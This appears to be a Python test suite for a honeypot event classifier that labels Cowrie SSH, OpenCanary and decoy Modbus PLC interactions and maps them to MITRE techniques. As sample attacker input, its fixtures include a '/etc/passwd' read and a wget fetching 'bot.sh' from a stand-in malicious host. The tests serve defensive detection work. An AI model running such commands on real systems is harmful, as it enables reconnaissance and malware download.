"""Unit and integration tests for SentinelX Deception Intelligence Engine."""

import tempfile
from datetime import UTC, datetime
from pathlib import Path

from sentinelx.deception.classifier import (
    classify_deception_event,
    generate_deception_interpretations,
    is_deception_event,
)
from sentinelx.deception.service import (
    get_deception_activity,
    get_deception_assets,
    get_deception_overview,
    list_deception_activities,
)
from sentinelx.schemas.common import Domain, Outcome, Severity, SourceTool
from sentinelx.schemas.event import Event, OTFields
from sentinelx.store.sqlite import init_db, insert_event


def create_sample_event(
    event_id: str,
    action: str,
    source_tool: SourceTool,
    host: str,
    src_ip: str | None = "10.10.1.5",
    dst_ip: str | None = "10.10.2.20",
    cmdline: str | None = None,
    user: str | None = "root",
    raw: dict | None = None,
    ot: OTFields | None = None,
    ts: datetime | None = None,
) -> Event:
    now = ts or datetime(2026, 11, 10, 12, 0, 0, tzinfo=UTC)
    return Event(
        event_id=event_id,
        ts=now,
        ingested_at=now,
        source_tool=source_tool,
        domain=Domain.decoy,
        category="decoy_interaction",
        action=action,
        outcome=Outcome.success,
        src_ip=src_ip,
        dst_ip=dst_ip,
        host=host,
        user=user,
        cmdline=cmdline,
        ot=ot,
        raw_ref={"path": "/tmp/test.log", "line": 1},
        raw=raw or {},
        tags=["deception"],
    )


def test_classify_cowrie_interactions():
    """Verify Cowrie honeypot events are classified accurately."""
    # 1. Login success
    ev_login_success = create_sample_event(
        event_id="cowrie_01",
        action="login_success",
        source_tool=SourceTool.cowrie,
        host="backup-srv-02",
        raw={"user": "root", "password": "password123"},
    )
    assert is_deception_event(ev_login_success) is True
    act = classify_deception_event(ev_login_success)
    assert act is not None
    assert act.interaction_type == "ssh_login_success"
    assert act.decoy_type == "ssh_decoy"
    assert act.severity == Severity.high
    assert act.src_ip == "10.10.1.5"
    assert "backup-srv-02" in act.description
    assert "T1078" in (act.mitre_technique or "")

    # 2. Command input
    ev_cmd = create_sample_event(
        event_id="cowrie_02",
        action="command_input",
        source_tool=SourceTool.cowrie,
        host="backup-srv-02",
        cmdline="uname -a && cat /etc/passwd",
    )
    act_cmd = classify_deception_event(ev_cmd)
    assert act_cmd is not None
    assert act_cmd.interaction_type == "ssh_command_input"
    assert act_cmd.severity == Severity.high
    assert "cat /etc/passwd" in act_cmd.description
    assert "T1059" in (act_cmd.mitre_technique or "")


def test_classify_opencanary_interactions():
    """Verify OpenCanary multi-service decoy events are classified accurately."""
    ev_mysql = create_sample_event(
        event_id="canary_01",
        action="mysql_login_attempt",
        source_tool=SourceTool.opencanary,
        host="db-prod-02",
        dst_ip="10.10.2.30",
        raw={"logtype": 2001, "data": {"USERNAME": "root"}},
    )
    assert is_deception_event(ev_mysql) is True
    act = classify_deception_event(ev_mysql)
    assert act is not None
    assert act.interaction_type == "mysql_login_attempt"
    assert act.decoy_type == "multi_service_decoy"
    assert act.network_zone == "dmz"
    assert act.severity == Severity.high


def test_classify_decoy_plc_interactions():
    """Verify Decoy PLC Modbus telemetry is classified accurately."""
    ot_read = OTFields(
        unit_id=1,
        function_code=3,
        register=100,
        value=None,
        is_write=False,
    )
    ev_modbus = create_sample_event(
        event_id="plc_01",
        action="read_holding_registers",
        source_tool=SourceTool.modbus,
        host="decoy-plc",
        src_ip="10.10.3.40",
        dst_ip="10.10.3.60",
        ot=ot_read,
    )
    assert is_deception_event(ev_modbus) is True
    act = classify_deception_event(ev_modbus)
    assert act is not None
    assert act.interaction_type == "modbus_read"
    assert act.decoy_type == "plc_decoy"
    assert act.network_zone == "ot"
    assert act.severity == Severity.high
    assert "T0814" in (act.mitre_technique or "")


def test_non_deception_events_ignored():
    """Verify standard production host telemetry is not classified as deception."""
    now = datetime(2026, 11, 10, 12, 0, 0, tzinfo=UTC)
    ev_prod = Event(
        event_id="prod_01",
        ts=now,
        ingested_at=now,
        source_tool=SourceTool.wazuh,
        domain=Domain.it,
        category="process",
        action="process_created",
        outcome=Outcome.success,
        host="file-srv",
        dst_ip="10.10.1.20",
        raw_ref={"path": "/var/log/syslog", "line": 1},
        raw={},
    )
    assert is_deception_event(ev_prod) is False
    assert classify_deception_event(ev_prod) is None


def test_generate_deception_interpretations_separation():
    """Verify observed facts vs inferred intent are strictly separated."""
    ev = create_sample_event(
        event_id="cowrie_03",
        action="command_input",
        source_tool=SourceTool.cowrie,
        host="backup-srv-02",
        cmdline="wget http://malware.evil/bot.sh",
    )
    act = classify_deception_event(ev)
    assert act is not None
    interpretations = generate_deception_interpretations([act])

    assert len(interpretations) > 0
    text = interpretations[0]
    assert "OBSERVED:" in text
    assert "INFERRED:" in text
    assert "honeypot sandbox" in text


def test_deception_service_and_store_integration():
    """Verify deception service functions using a SQLite database."""
    with tempfile.TemporaryDirectory() as tmpdir:
        db_path = Path(tmpdir) / "test_deception.db"
        conn = init_db(db_path)

        ev1 = create_sample_event(
            event_id="ev_001",
            action="login_success",
            source_tool=SourceTool.cowrie,
            host="backup-srv-02",
            ts=datetime(2026, 11, 10, 12, 0, 0, tzinfo=UTC),
        )
        ev2 = create_sample_event(
            event_id="ev_002",
            action="write_single_register",
            source_tool=SourceTool.modbus,
            host="decoy-plc",
            src_ip="10.10.3.40",
            dst_ip="10.10.3.60",
            ot=OTFields(unit_id=1, function_code=6, register=10, value=1, is_write=True),
            ts=datetime(2026, 11, 10, 12, 5, 0, tzinfo=UTC),
        )
        insert_event(conn, ev1)
        insert_event(conn, ev2)

        # 1. Overview
        overview = get_deception_overview(conn)
        assert overview.total_interactions == 2
        assert len(overview.top_decoys) >= 2

        # 2. Activities list
        activities = list_deception_activities(conn)
        assert len(activities) == 2
        # Most recent first
        assert activities[0].event_id == "ev_002"
        assert activities[1].event_id == "ev_001"

        # 3. Filter by decoy_type
        cowrie_acts = [a for a in activities if a.decoy_type == "ssh_decoy"]
        assert len(cowrie_acts) == 1
        assert cowrie_acts[0].decoy_type == "ssh_decoy"

        # 4. Detail lookup
        act = get_deception_activity(conn, "ev_001")
        assert act is not None
        assert act.decoy_hostname == "backup-srv-02"

        # 5. Assets list
        assets = get_deception_assets(conn)
        assert len(assets) == 3
        cowrie_asset = next(a for a in assets if a.name == "cowrie")
        assert cowrie_asset.total_interactions == 1


def test_missing_source_ip_and_empty_cmdline_classification():
    """Verify event classification handles missing src_ip and empty cmdline gracefully."""
    ev = create_sample_event(
        event_id="cowrie_empty_cmd",
        action="command_input",
        source_tool=SourceTool.cowrie,
        host="backup-srv-02",
        src_ip=None,
        cmdline="",
    )
    act = classify_deception_event(ev)
    assert act is not None
    assert act.src_ip is None
    assert "submitted input" in act.description
    assert act.interaction_type == "ssh_command_input"


def test_unauthorized_modbus_write_attempt_not_described_as_success():
    """EVIDENCE INTEGRITY: Modbus write attempts are never described as successful process changes."""
    ev = create_sample_event(
        event_id="plc_write_attempt_01",
        action="write_single_register",
        source_tool=SourceTool.modbus,
        host="decoy-plc",
        src_ip="10.10.3.40",
        dst_ip="10.10.3.60",
        ot=OTFields(unit_id=1, function_code=6, register=200, value=999, is_write=True),
    )
    act = classify_deception_event(ev)
    assert act is not None
    assert act.interaction_type == "modbus_write_attempt"
    assert "Attempt" in act.title
    assert "Unauthorized Modbus write command delivered" in act.description
    # Outcome describes telemetry status, but text never claims physical process alteration
    assert "process altered" not in act.description.lower()
    assert act.mitre_technique == "T0855"


def test_unknown_asset_not_assigned_to_canary():
    """EVIDENCE INTEGRITY: Unknown or production assets are never assigned to canary infrastructure."""
    ev_unknown = Event(
        event_id="evt_unknown_prod",
        ts=datetime(2026, 11, 10, 12, 0, 0, tzinfo=UTC),
        ingested_at=datetime(2026, 11, 10, 12, 0, 0, tzinfo=UTC),
        source_tool=SourceTool.zeek,
        domain=Domain.it,
        category="network",
        action="conn",
        outcome=Outcome.success,
        src_ip="10.10.1.20",
        dst_ip="10.10.1.30",
        host="db-srv",
        raw_ref={"path": "/var/log/zeek/conn.log", "line": 5},
        raw={},
    )
    assert is_deception_event(ev_unknown) is False
    assert classify_deception_event(ev_unknown) is None
